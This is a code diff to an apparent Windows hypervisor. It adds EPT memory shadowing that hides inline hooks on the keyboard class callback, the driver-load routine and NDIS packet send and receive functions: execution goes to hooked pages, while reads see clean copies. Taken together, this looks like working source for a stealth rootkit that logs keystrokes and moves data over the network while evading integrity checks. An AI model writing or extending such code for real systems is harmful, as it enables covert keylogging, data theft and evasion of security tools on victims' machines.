@@ -9,6 +9,7 @@
 #include <hooks/hooking.h> 
 #include <hooks/keyboard.h> 
 #include <hooks/ndis.h> 
+#include <vmm/paging.h>
 
 
 #define LOWER_DWORD(x) ((x) & 0xffffffffull)
@@ -84,12 +85,12 @@ void __attribute__((section(".vmm"))) vmexit_handler(){
             #endif
             
             if (shared_cores_data.send_requests){
-                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
+                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
             }
             else {
                 // Initiate sending
                 shared_cores_data.send_pending = TRUE;
-                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
+                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
             }
 
             // Disable timer
@@ -98,6 +99,49 @@ void __attribute__((section(".vmm"))) vmexit_handler(){
             pin_based_ctls.activate_vmx_preemption_timer = FALSE;
             __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
     
+            return;
+        case EXIT_REASON_EPT_VIOLATION:
+            qword_t page = ALIGN_DOWN(state.guest_physical_address, PAGE_SIZE);
+            if (state.exit_qual.ept_violation.instr_fetch) {
+                // Switch to X page
+                ept_pte_t *pte = get_ept_pte_from_guest_address(state.guest_physical_address);
+                modify_pte_access(pte, 0, 0, 1);
+                if (page == shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x)
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x);
+                else if (page == shared_cores_data.memory_shadowing_pages.MiDriverLoadSucceeded_x)
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.MiDriverLoadSucceeded_x);
+                else if (page == shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_x)
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_x);
+                else if (page == shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x)
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x);
+            }
+            else {
+                // Switch to RW page
+                ept_pte_t *pte = get_ept_pte_from_guest_address(state.guest_physical_address);
+                modify_pte_access(pte, 1, 1, 0);
+                if (page == shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x){
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_rw);
+                    LOG_DEBUG("Protecting KeyboardClassServiceCallback from RW\n");
+                }
+                else if (page == shared_cores_data.memory_shadowing_pages.MiDriverLoadSucceeded_x){
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.MiDriverLoadSucceeded_rw);
+                    LOG_DEBUG("Protecting MiDriverLoadSucceeded from RW\n");
+                }
+                else if (page == shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_x){
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_rw);
+                    LOG_DEBUG("Protecting NdisMIndicateReceiveNetBufferLists from RW\n");
+                }
+                else if (page == shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x){
+                    modify_pte_page(pte, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
+                    LOG_DEBUG("Protecting ndisMSendNBLToMiniportInternal from RW\n");
+                }
+            }
+
+            invept_descriptor_t descriptor;
+            descriptor.eptp = (eptp_t)__vmread(CONTROL_EPTP);
+            descriptor.zeros = 0;
+            __invept(&descriptor, 1);
+
             return;
         case EXIT_REASON_INIT:
             // LOG_DEBUG("INIT VMEXIT\n");
